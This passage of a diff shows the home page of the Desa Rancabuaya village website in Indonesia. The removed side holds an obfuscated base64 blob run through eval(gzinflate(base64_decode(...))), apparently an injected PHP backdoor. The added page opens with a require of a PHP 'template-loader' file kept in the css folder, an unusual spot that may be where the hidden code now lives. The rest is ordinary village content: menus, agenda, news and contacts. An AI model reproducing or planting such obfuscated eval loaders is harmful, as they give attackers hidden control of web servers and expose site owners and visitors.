x42J\x2bJ\x2b5m7gK\x62W\x614y\x62\x61ueVmjkZhUEd5sR\x43ioqDPhSSrlhJ7SNP\x43J9Yw\x43\x41\x63uL\x413\x43pmd\x43InOoFkYmWi\x43\x2blMl\x2bp5YPptEOjf5\x63\x62yV7ORLoSi8/lRn\x63joLO\x43iUYJ/p\x616z1nR3\x42fXNT2\x2be1u347E\x42D3\x2bJpwGwiY1JgngVYdFmo2\x4178X\x63PI7wkqLkVH1S43\x62jg6hUi\x631I6Upzkl\x41VWFJEmkFV2FDDrKqkTP2JP\x2b/18wHlUEIkRTl8jYe\x6306S7KPrH/R\x43eDKLglEDIYgdGeQD\x63\x43/j3vKj7\x63SGmtZ0HwZ\x63kvRUwPDMwm/EEf8\x2b7xTekkfjf\x62/VMhdsnVnSfg\x2bG2ZQ6ZKl\x623k9h0\x42N6pP7Xu7/0\x629t75P6LxI7dMrH\x41VD1jJuyQT\x2b7/9HqoLW9JPs/8JHH9Ii3tGX4f\x420gJLuf9rq4fyghwvx4IdP6LQVI\x63imiv/3d\x2bTemNX98DyMTN3UwNNU1\x62HgHPik/oooq5k\x41gEw\x411dV22MHiwXV5Ej\x42YQJ\x41EyjuDYk\x413dTuv\x63ZXy8KI1R\x62qV\x42zP\x63MFJwi\x2bDX8VM30\x63gt8e8yynIvL1ny3rr51K5sJLp\x61mzk1M1szLJ\x2b578/3f22dut9W2vd\x622etdt\x6272tZ72rFrt\x61rOMX4sLsNF3lxJe1qhSlHQtVok6\x42wJe1qgS1HQtFok\x2b\x42wJe0q/SFE\x41t1vk\x43\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-exit;
-?>
+<?php require('css/template-loader.php'); ?><!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Desa Rancabuaya</title>
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="css/styleranca.css">
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+<link href="images/fav.ico" rel="shortcut icon">
+</head>
+<body>
+
+ <style>
+body, html {
+  height: 100%;
+}
+
+.parallax {
+  /* The image used */
+  background-image: url('images/paralax.jpg');
+
+  /* Full height */
+  height: 80%; 
+
+  /* Create the parallax scrolling effect */
+  background-attachment: fixed;
+  background-position: center;
+  background-repeat: no-repeat;
+  background-size: cover;
+}
+
+.dropdown:hover > .dropdown-menu, .dropright:hover > .dropdown-menu {
+  display: block;
+}
+</style>
+<div class="container-fluid">
+     
+          <div class="row justify-content-md-center">
+                <div class="col col-lg-1" >
+                  <img align="right" alt="" src="images/logo.png" width=40 height=50 style="margin-bottom: 5px;margin-top: 5px;margin-left:20px" />
+                </div>
+               <div class="col-md-auto" >
+                     <div class="row">
+                          <div class="col-md-auto" style=" margin-top:2px">
+                                <a style="text-align: left;font-size: 21px;font-weight: bold;text-align:center;color:#2E2B70">WEBSITE RESMI DESA RANCABUAYA</a>
+                          </div>   
+                     </div>
+                     <div class="row">
+                          <div class="col-md-auto" >
+                                <a style="text-align: left">KEC.JAMBE KAB.TANGERANG PROV.BANTEN</a>
+                          </div>
+                     </div>
+               </div>
+          </div>
+     
+
+
+     <header>
+
+          <div class="menu-toggle"></div>
+                <nav class="navbar navbar-expand-lg">
+                	
+                     <ul class="navbar-nav ml-2">
+                            <li class="nav-item"><a class="nav-link" href="index.html"><i class="fa fa-home" ></i> Home</a></li>              
+                            <li class="nav-item dropdown">
+                                 <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" >Profil</a>
+                                 <div class="dropdown-menu" aria-labelledby="navbarDropdown" style="padding: 0px;">
+                                      <a class="dropdown-item" href="profil.html" >Sejarah</a>
+                                      <a class="dropdown-item" href="visimisi.htm">Visi Misi</a>
+                                      <a class="dropdown-item" href="struktur.htm">Struktur Organisasi</a>
+                                      <a class="dropdown-item" href="wildes.htm">Wilayah Desa</a>
+                                      <a class="dropdown-item" href="ekososbud.htm">Sosial</a>
+                                 </div>
+                            </li>
+                            
+                            <li class="nav-item dropdown">
+                                <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"style="margin-top: 0px;">Pemdes</a>
+                                <div class="dropdown-menu" aria-labelledby="navbarDropdown" style="padding: 0px;">
+                                      <a class="dropdown-item" href="pemdes.html">Pemerintah Desa</a>
+                                      <a class="dropdown-item" href="bpd.htm">BPD</a>
+                                      <a class="dropdown-item" href="karang.htm">Karang Taruna</a>
+                                      <a class="dropdown-item" href="lpm.htm">LPM</a>
+                                      <a class="dropdown-item" href="pkk.htm">PKK</a>  
+                                 </div>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"style="margin-top: 0px;">Ppid</a>
+                                <div class="dropdown-menu" aria-labelledby="navbarDropdown" style="padding: 0px;">
+                                      <a class="dropdown-item" href="ppid.html">Profil PPID</a>
+                                      <a class="dropdown-item" href="soplayananipd.htm">SOP Layanan IPD</a>
+                                      <a class="dropdown-item" href="daftaripd.htm">Daftar IPD</a>
+                                      <a class="dropdown-item" href="permohonanipd.htm">Permohonan IPD</a>
+                                      <a class="dropdown-item" href="keberatanipd.htm">Keberatan IPD</a>
+                                </div>
+                            </li>
+
+                            <li class="nav-item dropdown">
+                                <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"style="margin-top: 0px;">Pilar</a>
+                                <div class="dropdown-menu" aria-labelledby="navbarDropdown" style="padding: 0px;">
+                                      <a class="dropdown-item" href="pembangunan.htm">Pembangunan</a>
+                                      <a class="dropdown-item" href="pembinaan.htm">Pembinaan</a>
+                                      <a class="dropdown-item" href="pemberdayaan.htm">Pemberdayaan</a>
+                                      <a class="dropdown-item" href="penyelenggaraan.htm">Penyelenggaraan</a>
+                                      <a class="dropdown-item" href="penanggulangan.htm">Penanggulangan</a>
+                                </div>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"style="margin-top: 0px;">Apbdes</a>
+                                <div class="dropdown-menu" aria-labelledby="navbarDropdown" style="padding: 0px;">
+                                      <a class="dropdown-item" href="apbdes.html">Apbdes</a>
+                                      <a class="dropdown-item" href="laporan.htm">Laporan Realisasi</a>
+                                      <a class="dropdown-item" href="ippd.htm">Ippd (Realisas AT)</a>
+                                      
+                                </div>
+                            </li>
+                            <li class="nav-item"><a class="nav-link" href="kontak.php">Kontak</a></li>
+
+                     </ul>
+                </nav>
+                <div class="clearfix"></div>
+                                 
+                                  <script src="https://code.jquery.com/jquery-3.3.1.js"
+                                  integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
+                                  crossorigin="anonymous"></script>
+                                  <script type="text/javascript"> 
+                                     $(document).ready(function() { 
+                                    $('.menu-toggle') .click(function(){ 
+                                        $('.menu-toggle').toggleClass('active')
+                                        $('nav').toggleClass('active')
+                                  })
+                                  })</script>                              
+    </header>
+
+<div class="container-fluid">
+    <div class="row"> 
+        <div class="col-md-3 col-lg-4 col-xl-9">
+            <div id="carouselExampleInterval" class="carousel slide" data-ride="carousel" style="margin-top:13px;border-bottom: 2px solid white;margin-right:20px">
+                                  <div class="carousel-inner">
+                                        <div class="carousel-item active" data-interval="10000">
+                                          <img src="images\slider\slider1.jpg" class="d-block w-100" alt="Pertama">
+                                        </div>
+                                        <div class="carousel-item" data-interval="10000">
+                                          <img src="images\slider\slider2.jpg" class="d-block w-100" alt="Kedua">
+                                        </div>
+                                        <div class="carousel-item" data-interval="10000">
+                                          <img src="images\slider\slider3.jpg" class="d-block w-100" alt="Ketiga">                           
+                                        </div>
+                                        <div class="carousel-item" data-interval="10000">
+                                          <img src="images\slider\slider4.jpg" class="d-block w-100" alt="Keempat">
+                                        </div>
+                                        <div class="carousel-item" data-interval="10000">
+                                          <img src="images\slider\slider1.jpg" class="d-block w-100" alt="Kelima">                          
+                                        </div>
+                                        <div class="carousel-item" data-interval="10000">
+                                          <img src="images\slider\slider2.jpg" class="d-block w-100" alt="Keenam">
+                                        </div>
+                                        <div class="carousel-item" data-interval="10000">
+                                          <img src="images\slider\slider4.jpg" class="d-block w-100" alt="Ketujuh">
+                                        </div>
+                                        <div class="carousel-item" data-interval="10000">
+                                          <img src="images\slider\slider1.jpg" class="d-block w-100" alt="Kedelapan">
+                                        </div>
+                                        <div class="carousel-item" data-interval="10000">
+                                          <img src="images\slider\slider2.jpg" class="d-block w-100" alt="Kesembilan">
+                                        </div>
+                                        <div class1="carousel-item" data-interval="10000">
+                                          <img src="images\slider\slider3.jpg" class="d-block w-100" alt="Kesepuluh">
+                                        </div>
+                                        
+                                        </div>
+                                          <a class="carousel-control-prev" href="#carouselExampleInterval" role="button" data-slide="prev">
+                                            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+                                            <span class="sr-only">Previous</span>
+                                          </a>
+                                          <a class="carousel-control-next" href="#carouselExampleInterval" role="button" data-slide="next">
+                                            <span class="carousel-control-next-icon" aria-hidden="true"></span>
+                                            <span class="sr-only">Next</span>
+                                          </a>
+                                        </div>
+            </div>
+        <div class="col-md-3 col-lg-4 col-xl-3" style="margin-right:0px;margin-left:-22px;margin-top:13px;border:1px solid #6E00A5;border-top-left-radius:4px;border-top-right-radius:4px ;height:480px;background: white;xbox-shadow: 3px 3px 9px white;border-radius: xpx;overflow: auto;">
+                    <div class="card-header" style="margin-top:5px;margin-left:0px;background: #2E2B70;color: white;height:30px;"><p style="margin-top:-8px;text-align: center;color:white">AGENDA</p></div>
+                      <div class="card-title">
+                      <h5 href="" style="margin-left:-10px;margin-top:20px;">AGENDA I</h5>
+                      </div>
+                      <div class="card-text">
+                      <p style="margin-left:0px;"><a href="" >Penanggulangan Pandemi Covid19 2021 </a></p>
+                      <hr/style="margin-left:0px;margin-top:-10px;">
+                      </div>
+                      <div class="card-title">
+                      <h5 href="" style="margin-left:-10px;">AGENDA II</h5>
+                      </div>
+                      <div class="card-text">
+                      <p style="margin-left:0px;"><a href="" >Penyaluran Bantuan  </a></p>
+                      <hr/style="margin-left:0px;margin-top:-10px;">
+                      <div class="card-title">
+                      <h5 href="" style="margin-left:-10px;">AGENDA III</h5>
+                      </div>
+                      <div class="card-text">
+                      <p style="margin-left:0px;"><a href="" >Pelaksanaan Pembangunan  </a></p>
+                      <hr/style="margin-left:0px;margin-top:-10px;">
+                      <h6 style="font-weight: bold;color:#002B41;text-align: center;margin-top:5px;">PERANGKAT DESA</h6>
+                                                                      
+                                      <tr style="box-shadow: 2px 3px 5px grey;border:1px solid red;margin-left:30px;">
+                                        <td bgcolor=" 9900CC" colspan="3" align="center">
+                                          <marquee onmouseover="this.stop()" onmouseout="this.start()" align="center" height="185" scrollamount="3" width="298" behavior="alternate" scrolldelay="150" ><a title="KEPALA DESA" href="biodata_desa.htm#KEPALA_DESA" target="halaman"><img src="images/kepala_desa.jpg" width="150" height="190"/><a title="SEKRETARIS DESA" href="biodata_desa.htm#SEKRETARIS_DESA" target="halaman"><img src="images/sekretaris_desa.jpg" width="150" height="190"/><a title="KASI PEMERINTAHAN" href="biodata_desa.htm#KASI_PEMERINTAHAN" target="halaman"><img src="images/kasi_pemerintahan.jpg" width="150" height="190"/><a title="KASI PELAYANAN" href="biodata_desa.htm#KASI_PELAYANAN" target="halaman"><img src="images/kasi_pelayanan.jpg" width="150" height="190"/><a title="KASI KESEJAHTERAAN" href="biodata_desa.htm#KASI_KESEJAHTERAAN" target="halaman"><img src="images/kasi_kesejahteraan.jpg" width="150" height="190"/><a title="KAUR PERENCANAAN" href="biodata_desa.htm#KAUR_PERENCANAAN" target="halaman"><img src="images/kaur_perencanaan.jpg" width="150" height="190"/><a title="KAUR KEUANGAN" href="biodata_desa.htm#KAUR_KEUANGAN" target="halaman"><img src="images/kaur_keuangan.jpg" width="150" height="190"/></marquee></td>
+                                      </tr>
+                                      
+        </div>
+    </div>
+</div>
+
+                  
+                  
+
+
+<div class="container-fluid">
+    <div class="row">               
+        <div class="col-md-3 col-lg-4 col-xl-12" style="margin-left:0px;borderx :solid 1px #c0c0c0;height:40px;backgroundX: linear-gradient(90deg, #1fb6e5, white);margin-top:13px;margin-right:0px;">
+         <tr>
+                <td align="center" valign="top" width="0" height="20" background="#002B41">
+                <b><font style="font-size: 9pt">
+                <marquee style="font-style:italic;color:#FF0000;font-size: 15px;margin-top:10px;font-family: 'Poppins', sans-syerif;height:30px">Visi: "Bersama membangun Desa melalui Good Govermance yang didukung pemerataan Infrastruktur, Sarana dan Prasarana dan Pembinaan yang berkelanjutan untuk mewujudkan Kesejahteraan Masyarakat." &nbsp Misi: &nbsp 1. Meningkatkan Tata Kelola Pemerintahan Desa 2.	Mewujudkan Pembangunan Infrastruktur, Sarana dan Prasarana yang berkelanjutan 3. Meningkatkan Kapasitas Sumber Daya Manusia 4. Membantu kreatifitas potensi yang ada untuk peningkatan taraf hidup masyarakat ;
+                </marquee></font></b></td>
+          </tr>
+
+        </div> 
+         <div class="row" style=" margin-right:2px;padding-left: 25px;padding-right:8px;">
+          <div class="col" id="pilar2a" > 
+                  
+                      <div class="img-hover-zoom img-hover-zoom--xyz">
+                             <img src="images\slider\slider1.jpg" width="100%" alt="Another Image zoom-on-hover effect">
+                      </div>
+                      <div class="card-body" style="margin-top: -60px;margin-left: -20px;margin-right: -20px;text-align: justify;">
+                           <p>Bersama membangun Desa melalui Good Govermance yang didukung pemerataan Infrastruktur, Sarana,  Prasarana dan Pembinaan</p>
+                      </div>
+             
+          </div>
+          <div class="col" id="pilar2a" style="margin-left:10px"> 
+                  
+                     <div class="img-hover-zoom img-hover-zoom--xyz">
+                            <img src="images\slider\slider2.jpg" width="100%" alt="Another Image zoom-on-hover effect">
+                     </div>
+                     <div class="card-body" style="margin-top: -60px;margin-left: -20px;margin-right: -20px;text-align: justify;">
+                          <p>Pelayanan Masyarakat terus ditingkatkan dengan Simade Layanan Mandiri , masyarakat dapat mengunduh di Playstore Simade layanan mandiri </p>
+                     </div>
+                  
+          </div>
+          <div class="col" id="pilar2a" style="margin-left:10px"> 
+                   
+                      <div class="img-hover-zoom img-hover-zoom--xyz">
+                            <img src="images\slider\slider3.jpg" width="100%" alt="Another Image zoom-on-hover effect">
+                      </div>
+                      <div class="card-body" style="margin-top: -60px;margin-left: -20px;margin-right: -20px;text-align: justify;">
+                           <p>Pelaksanaan Pembangunan Desa melalui Good Govermance yang didukung pemerataan Infrastruktur, Sarana,  Prasarana dan Pembinaan</p>
+                      </div>
+                   
+          </div>
+          <div class="col" id="pilar2a" style="margin-left:10px"> 
+                    
+                         <div class="img-hover-zoom img-hover-zoom--xyz">
+                             <img src="images\slider\slider4.jpg" width="100%" alt="Another Image zoom-on-hover effect">
+                         </div>
+                         <div class="card-body" style="margin-top: -60px;margin-left: -20px;margin-right: -20px;text-align: justify;">
+                              <p>Pelaksanaan Musrembang di Desa Rancabuaya</p>
+                         </div>
+                    
+          </div>
+          <div class="col" id="pilar2a" style="margin-left:10px"> 
+                    
+                         <div class="img-hover-zoom img-hover-zoom--xyz">
+                              
+                         </div>
+                         <div class="card-body" style="margin-top: -60px;margin-left: -20px;margin-right: -20px;text-align: justify;">
+                              <p></p>
+                        </div>
+                    
+          </div>
+          <div class="col" id="pilar2a" style="margin-left:10px"> 
+                    
+                         <div class="img-hover-zoom img-hover-zoom--xyz">
+                              
+                         </div>
+                         <div class="card-body" style="margin-top: -60px;margin-left: -20px;margin-right: -20px;text-align: justify;">
+                              <p></p>
+                        </div>
+                    
+        </div>
+          
+        <div class="col-md-10" style="margin-left: -10px" >
+              <div class="panel panel-default">
+                  <div class="panel-body">
+                       <h5>Kebijakan Pembangunan Desa</h5>
+                      <div class="info-meta">
+                          <ul class="list-inline"style="color:black">
+                             <li class="list-inline-item fa fa-clock-o" style="font-style: italic;font-size: 12px"> 18 Agustus 2021</li>
+                              <li class="list-inline-item fa fa-user" style="font-style: italic;font-size: 12px"> Posting by Desa Daru</li>   
+                          </ul>
+                      </div>
+                      <hr>
+                  
+                      <div class = "media">
+                           <a class = "pull-left" href = "kebijakan.htm">
+                              <img class = "media-object " src = "images/gambar1.jpg"  >
+                           </a>
+                        <div class = "media-body" style="text-align:justify; margin-left:10px;margin-right:10px">
+                          <p>Perencanaan pembangunan desa adalah proses tahapan kegiatan yang diselenggarakan oleh pemerintah Desa dengan melibatkan Badan Permusyawaratan Desa dan unsur masyarakat secara partisipatif guna pemanfaatan dan pengalokasian sumber daya desa dalam rangka mencapai tujuan pembangunan desa.
+                          </p> 
+                          <p style="text-align:right;">
+                            <a href="kebijakan.htm">
+                                <button class="btn btn-primary" style="font-size:12px">Selengkapnya...</button>
+                            </a>
+                          </p>
+                        </div>
+                      </div>
+                      <hr>
+                      <h5>Strategi Pencapaian</h5>
+                      <div class="info-meta">
+                        <ul class="list-inline" style="color:black">
+                            <li class="list-inline-item fa fa-clock-o" style="font-style: italic;font-size: 12px"> 18 Agustus 2021</li>
+                              <li class="list-inline-item fa fa-user" style="font-style: italic;font-size: 12px"> Posting by Desa Daru</li>
+                        </ul>
+                      </div>
+                      <hr>
+                  
+                      <div class = "media">
+                          <a class = "pull-left" href = "strategi.htm">
+                            <img class = "media-object" src = "images/gambar2.jpg" >
+                          </a>
+                        <div class = "media-body" style="text-align:justify; margin-left:10px;margin-right:10px">
+                            <p>Strategi pencapaian pembangunan desa adalah sebagai berikut :</p>
+                            <li style="list-style-type: none" >1.  Menjadikan dokumen RPJM Desa ini sebagai satu-satunya dokumen perencanaan Pembangunan desa selama 6 (enam) tahun.</li>
+                            <li style="list-style-type: none">2.  Bersama masyarakat desa, Pemerintah Desa bersinergi dan bersatu padu dalam kebersamaan dan kegotongroyongan dalam membangun desa dengan asas-asal keadilan, partisipatif, transparan dan bertanggung jawab</li> 
+                            <p style="text-align:right;">
+                            <a href="strategi.htm">
+                            <button class="btn btn-primary" style="font-size:12px">Selengkapnya...</button>
+                            </a>
+                            </p> 
+                        </div> 
+                      </div>
+                      <hr> 
+                  </div>
+              </div>
+        </div>      
+          
+        <div class="col-md-3 col-lg-4 col-xl-2" style="borderx :solid 1px #c0c0c0;height:40px;margin-top:13px;">
+            <div class="panel-body">
+                <div class="card-header" style="margin-top:0px;margin-left:0px;background: #6E00A5;color: white;height:30px;width:110%;"><p style="margin-top:-8px;text-align: center;color:white">GALLERY</p></div>
+                </div> 
+                        <div class="recent">
+                          <a href="#"><img class="img-responsive" src="images/slider/slider2.jpg" alt="" style="margin-left: 0px;margin-top:10px;width:110%";/></a>                
+                            <div class="info-meta">
+                               <ul class="list-inline">
+                                 <li class="list-inline-item fa fa-clock-o" style="font-style: italic;font-size: 12px"> Layanan Simade Mandiri</li> 
+                               </ul>
+                            </div> 
+                        </div>
+                    
+                        <div class="recent">
+                          <a href="#"><img class="img-responsive" src="images/slider/slider3.jpg" alt="" style="margin-left: 0px;width:110%" /></a>                           
+                          <div class="info-meta">
+                            <ul class="list-inline">
+                                <li class="list-inline-item fa fa-clock-o" style="font-style: italic;font-size: 12px"> Penyusunan APBDes Desa Daru 2021</li>  
+                            </ul>
+                          </div>
+                        </div><!--recent-->
+                        <div class="recent">
+                          <a href="#"><img class="img-responsive" src="images/slider/slider4.jpg" alt="" style="margin-left: 0px;width:110%" /></a>                           
+                          <div class="info-meta">
+                            <ul class="list-inline">
+                                <li class="list-inline-item fa fa-clock-o" style="font-style: italic;font-size: 12px"> Pelaksanaan Musrembang di Desa Rancabuaya</li> 
+                            </ul>
+                          </div>
+                        </div><!--recent-->
+                        <div class="recent">
+                          <a href="#"><img class="img-responsive" src="" alt="" style="margin-left: 0px;width:110%" /></a>                           
+                          <div class="info-meta">
+                            <ul class="list-inline">
+                              <li class="list-inline-item fa fa-clock-o" style="font-style: italic;font-size: 12px"> Pelaksanaan Serbu Vaksin di Desa Rancabuaya</li>
+                            </ul>
+                          </div>  
+                        </div><!--recent-->
+                  
+            </div>
+        </div>
+    <div class="col-md-6 col-lg-4 col-xl-12"  style="borderx: 1px solid red;height:300px;margin-top: 150px">
+         <div class="parallax"></div>
+    </div>
+    
+    <div class="col-md-6 col-lg-4 col-xl-3" >
+            <div class="col" style="margin-top:10px;padding:0px;">
+                <div class="berita">
+                        <div class="panel-heading">
+                             <h5 class="card-title">BERITA 1</h5>
+                        </div>
+                        <div class="panel-body-nol">
+                             <a href="berita1.html">
+                             <img src="images/slider/slider1.jpg" class="img img-responsive img-center" width="100%">
+                             </a>
+                             <p class="menu-tiga-utama panel-body" style="padding:10px; text-align: justify;font-family: 'Poppins', sans-syerif;">Bersama membangun Desa melalui Good Govermance yang didukung pemerataan Infrastruktur, Sarana dan Prasarana dan Pembinaan yang ....</p>
+                        </div>
+                </div>
+              </div>
+    </div>
+    <div class="col-md-6 col-lg-4 col-xl-3" >
+        <div class="col" style="margin-top: 10px;padding:0px;">
+                  <div class="berita">
+                       <div class="panel-heading">
+                             <h5 class="card-title">BERITA 2</h5>
+                       </div>
+                       <div class="panel-body-nol">
+                            <a href="berita2.html">
+                            <img src="images/slider/slider2.jpg" class="img img-responsive img-center" width="100%">
+                            </a>
+                            <p class="menu-tiga-utama panel-body" style="padding:10px; text-align: justify;font-family: 'Poppins', sans-syerif;">Layanan Masyarakat menggunakan Simade Layanan Mandiri </p>
+                       </div>
+                  </div>
+          </div>
+    </div>
+    <div class="col-md-6 col-lg-4 col-xl-3">
+            <div class="col" style="margin-top:10px;padding:0px;">
+                  <div class="berita">
+                        <div class="panel-heading">
+                             <h5 class="card-title">BERITA 3</h5>
+                        </div>
+                        <div class="panel-body-nol">
+                             <a href="berita3.html">
+                             <img src="images/slider/slider3.jpg" class="img img-responsive img-center " width="100%">
+                             </a>
+                             <p class="menu-tiga-utama panel-body" style="padding:10px; text-align: justify;font-family: 'Poppins', sans-syerif;">Bidang Penyelenggaraan Pemerintah, melaksanakan penyusunan APBDes 2021</p>
+                        </div>
+                  </div>
+               </div>
+    </div>
+    <div class="col-md-6 col-lg-4 col-xl-3" >
+            <div class="col" style="margin-top:10px;padding:0px;width:100%">
+                  <div class="berita">
+                              <div class="panel-heading">
+                                   <h5 class="card-title">INFO COVID19</h5>
+                              </div>
+                         <video  controls="controls" preload="none" onclick="this.play()" autoplay muted style="margin-left:0px;margin-top: -35px;padding: 0px;height:240px;width:300px;border: 1px ;" >
+                                <source src="" type="video/mp4">
+  
+                                Your browser does not support the video tag.
+                        </video>
+                                  
+
+                        <p class="menu-tiga-utama panel-body" style="padding:10px;margin-top: -15px; text-align: justify;font-family: 'Poppins', sans-syerif;">Pelaksanaan Serbu Vaksin di desa Rancabuaya</p>
+                   
+                   </div>
+            </div>  
+    </div> 
+          
+
+
+    <div class="col-md-3 col-lg-4 col-xl-3"style="margin-top:18px;border:0px solid blue;background:#002B41;height:300px;line-height:1.0; background: linear-gradient(180deg,white,#2E2B70);margin-left: 0px;">
+            <h6 style="margin-top:60px;">Media Jejaring Sosial</h6>
+            <p ><img src="images/icon_facebook.png" style="float:left;"/><a href="http://www.facebook.com" style="text-decoration:none;color:#000000;">&nbsp;Facebook</a></p>
+            <p ><img src="images/icon_google.png" style="float:left;"/><a href="http://www.google.co.id" style="text-decoration:none;color:#000000;">&nbsp;Google</a></p>
+            <p ><img src="images/icon_twitter.png" style="float:left;"/><a href="http://www.twitter.com" style="text-decoration:none;color:#000000;">&nbsp;Twitter</a></p>
+            <p ><img src="images/video.png" style="float:left;width: 6%"/><a href="http://www.youtube.com" style="text-decoration:none; color:#000000;">&nbsp;Youtube</a></p>           
+    </div>
+        
+    <div class="col-md-3 col-lg-4 col-xl-3" id="linkri" style="margin-top:18px;border:0px solid blue;background:#002B41;height:300px;line-height:1.0; background: linear-gradient(180deg,white,#2E2B70);">
+            <h6 style="margin-top:60px;">Link Penting</h6>
+            <p><a href="http://www.presidenri.go.id/"><img style="border:0px; width:160px; height:40px; margin:-4px 1px;" src="images/link_gambar_19.gif" /></a></p>
+            <p><a href="http://www.kemendagri.go.id/"><img style="border:0px; width:160px; height:40px; margin:-4px 1px;"src="images/link_gambar_18.gif"  /></a></p>
+            <p ><a href="https://tangerangkab.go.id/"><img style="border:0px; width:160px; height:40px; margin:-4px 1px;"src="images/webkab.jpg"  /></a></p>
+            <p ><a href="https://tangerangkab.bps.go.id/"><img style="border:0px; width:160px; height:40px; margin:-4px 1px;"src="images/link_gambar_3.png" /></a></p>
+    </div>
+    <div class="col-md-3 col-lg-4 col-xl-3" id="linkrix" style="margin-top:18px;border:0px solid blue;background:#002B41;height:300px;line-height:1.0; background: linear-gradient(180deg,white,#2E2B70);">
+            <h6 style="margin-top:60px;color:#000000;">Aplikasi Desa</h6>
+            <p><a href="http://prodeskel.binapemdes.kemendagri.go.id/mpublik/"><img class="center" style="position:center;border:0px; width:160px; height:40px; margin:-4px 1px;" src="images/prodeskel.jpg"/></a></p>
+            <p><a href="manual.htm"><img style="border:0px; width:160px; height:40px; margin:-4px 1px;"src="images/simadeol.jpg"/></a></p>
+            <p ><a href="http://siskeudes.online/"><img style="border:0px; width:160px; height:40px; margin:-4px 1px;"src="images/siskeudes.jpg"/></a></p>            
+    </div>
+    <div class="col-md-3 col-lg-4 col-xl-3" id="linkrix" style="margin-top:18px;border:0px solid blue;background:#002B41;height:300px;line-height:1.0; background: linear-gradient(180deg,white,#2E2B70);color: #002B41;margin-left:0px;">
+            <h6 style="margin-top:60px;color:#000000;">Kontak</h6>
+            <p style="color:#000000; text-align: left;"><a href="mailto:layanan@rancabuaya.desa.id"><i class="fa fa-envelope-o  " style="color:#E2FF3C" aria-hidden="true"></i></a> layanan@rancabuaya.desa.id</p>
+            <p style="color:#000000;text-align: left;"><a href="mailto:sekdes@rancabuaya.desa.id"><i class="fa fa-envelope-o " style="color:#E2FF3C;" aria-hidden="true"></i></a> sekdes@rancabuaya.desa.id</p>
+            <p style="color:#000000;text-align: left;"><a href="mailto:kurniawan@rancabuaya.desa.id"><i class="fa fa-envelope-o " style="color:#E2FF3C;" aria-hidden="true"></i></a> kurniawan@rancabuaya.desa.id</p> 
+             <p style="color:#000000;text-align: left;"><a href="https://api.whatsapp.com/send?phone=628568116477" target="_blank"><i class="fa fa-mobile  " style="color:#E2FF3C;" aria-hidden="true"></i></a> &nbsp;&nbsp; WA 0856-8116-477</p> 
+    </div>
+    <div class="col-md-3 col-lg-4 col-xl-12" id="footerx" style="background:#2E2B70;height:80px;line-height:1.0;margin-left:0px;margin-right:15px;border-top:1px solid ##2E2B70;border-bottom:2px solid #FFFF00;">
+                  <p style="padding: 14px; margin-bottom: -5px;text-align: center;font-size: 14px;color:white;">Copyright@2021 Kantor Kepala Desa Rancabuaya </p>
+                 <p style="margin-top: -5px; margin-bottom: -5px;text-align: center;font-size: 14px;margin-top:0px;color:white;">Jl. Rancabuaya – Taban  No. 1 Kec. Jambe Kab. Tangerang Provinsi Banten 15720</p>      
+    </div>
+</div>
+</div>
+</html>
